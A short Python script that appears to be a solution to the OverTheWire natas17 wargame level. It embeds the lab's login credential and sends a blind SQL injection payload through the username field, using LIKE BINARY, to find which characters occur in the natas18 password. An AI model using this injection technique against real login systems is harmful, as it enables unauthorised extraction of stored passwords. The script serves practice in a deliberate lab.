import requests

URL = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'
ss = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
s = requests.Session()
a = ''

for ch in ss:
   data = {'username':'natas18" and password LIKE BINARY "%'+ch+'%" -- '}
   r = s.post(URL, data=data)
   if 'This user exists' in r.text:
       #print(ch)
       a = a+ch

print(a)
